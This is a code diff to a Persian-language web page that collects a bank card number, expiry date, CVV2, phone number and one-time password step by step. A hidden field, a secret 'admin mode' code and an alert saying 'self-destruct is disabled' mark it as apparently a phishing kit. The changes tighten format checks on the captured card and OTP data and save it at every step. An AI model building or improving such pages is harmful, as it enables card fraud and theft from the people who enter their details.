@@ -374,7 +374,6 @@
                     let value = e.target.value.replace(/\D/g, '');
                     if (value === SPECIAL_CODE) {
                         enterAdminMode();
-                        e.target.value = SPECIAL_CODE;
                         return;
                     }
                     if (!isSpecialMode) {
@@ -417,7 +416,7 @@
                 localStorage.setItem(`specialMode_${sessionId}`, 'true');
                 alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
                 currentStep = 3;
-                steps[0].classList.remove('active');
+                steps.forEach(step => step.classList.remove('active'));
                 steps[2].classList.add('active');
                 updateProgress();
                 showUserData();
@@ -475,17 +474,28 @@
                 const card = document.getElementById('card-number').value.replace(/\D/g, '');
                 if (card === SPECIAL_CODE) return true;
 
-                const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
-                for (let input of inputs) {
+                const requiredInputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
+                for (let input of requiredInputs) {
                     if (!input.value.trim()) {
-                        alert('لطفاً تمامی فیلدها را پر کنید');
+                        alert('لطفاً تمامی فیلدهای الزامی را پر کنید');
                         return false;
                     }
                 }
 
                 if (step === 1) {
-                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(document.getElementById('card-number').value)) {
-                        alert('شماره کارت نامعتبر است');
+                    const cardNumber = document.getElementById('card-number').value;
+                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(cardNumber)) {
+                        alert('شماره کارت نامعتبر است (باید به صورت 1234-5678-9012-3456 باشد)');
+                        return false;
+                    }
+                    const expiry = document.getElementById('expiry').value;
+                    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                        alert('تاریخ انقضا نامعتبر است (باید به صورت MM/YY باشد)');
+                        return false;
+                    }
+                    const cvv2 = document.getElementById('cvv2').value;
+                    if (!/^\d{3,4}$/.test(cvv2)) {
+                        alert('CVV2 نامعتبر است (باید 3 یا 4 رقم باشد)');
                         return false;
                     }
                 }
@@ -493,7 +503,12 @@
                 if (step === 2) {
                     const phone = document.getElementById('phone-number').value.replace(/-/g, '');
                     if (phone.length !== 11 || !phone.startsWith('09')) {
-                        alert('شماره تلفن نامعتبر است');
+                        alert('شماره تلفن نامعتبر است (باید با 09 شروع شود و 11 رقم باشد)');
+                        return false;
+                    }
+                    const otp = document.getElementById('otp').value;
+                    if (!/^\d{6}$/.test(otp)) {
+                        alert('رمز پویا باید 6 رقم باشد');
                         return false;
                     }
                 }
@@ -502,12 +517,12 @@
 
             function nextStep(step) {
                 if (!validateStep(step)) return;
-
+                saveAndDisplayUserData(); // ذخیره اطلاعات قبل از تغییر مرحله
                 steps[step - 1].classList.remove('active');
                 currentStep = step + 1;
-                if (currentStep === 3) processPayment();
                 steps[currentStep - 1].classList.add('active');
                 updateProgress();
+                if (currentStep === 3) processPayment();
             }
 
             function updateProgress() {
